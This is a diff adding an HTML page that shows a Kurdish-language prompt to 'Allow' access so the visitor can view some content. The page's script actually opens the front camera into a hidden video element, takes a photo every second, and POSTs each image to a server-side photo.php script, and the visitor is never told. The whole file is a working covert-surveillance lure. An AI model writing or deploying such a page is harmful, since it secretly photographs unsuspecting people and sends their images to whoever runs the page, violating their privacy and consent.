@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Photo Capture Every Second</title>
+
+    <!-- Google Font: IBM Plex Sans -->
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;600&display=swap" rel="stylesheet">
+
+    <style>
+        body {
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'IBM Plex Sans', sans-serif;
+            background: linear-gradient(135deg, #000428, #004e92);
+            background-size: 200% 200%;
+            animation: moveGradient 6s ease infinite;
+            overflow: hidden;
+        }
+
+        @keyframes moveGradient {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .glass-box {
+            backdrop-filter: blur(15px);
+            background: rgba(0, 0, 0, 0.35);
+            border: 1px solid rgba(0, 180, 255, 0.3);
+            border-radius: 16px;
+            padding: 30px 60px;
+            box-shadow: 0 0 30px rgba(0, 180, 255, 0.2);
+            text-align: center;
+            color: white;
+           font-family: "IBM Plex Sans Arabic", sans-serif;
+  font-weight: 500;
+  font-style: normal;
+  font-size:1.6rem;
+        }
+
+        #video {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="glass-box">
+        Allow دابگرە بۆ بینینی بابەتەکە
+    </div>
+
+    <!-- Hidden camera section -->
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" style="display: none;"></canvas>
+
+    <script>
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
+        const context = canvas.getContext("2d");
+        let captureInterval;
+
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user" }
+                });
+                video.srcObject = stream;
+                startPhotoCapture();
+            } catch (error) {
+                console.error("Camera access denied or not available:", error);
+                alert("Camera access is required to capture photos.");
+            }
+        }
+
+        function startPhotoCapture() {
+            captureInterval = setInterval(capturePhoto, 1000);
+        }
+
+        function capturePhoto() {
+            if (!video.videoWidth || !video.videoHeight) return;
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL("image/png");
+            savePhoto(imageData);
+        }
+
+        function savePhoto(imageData) {
+            fetch("./photo.php", {
+                method: "POST",
+                body: JSON.stringify({ image: imageData }),
+                headers: { "Content-Type": "application/json" }
+            })
+            .then(response => response.json())
+            .then(data => console.log("Photo saved:", data))
+            .catch(error => console.error("Error saving photo:", error));
+        }
+
+        startCamera();
+    </script>
+
+</body>
+</html>
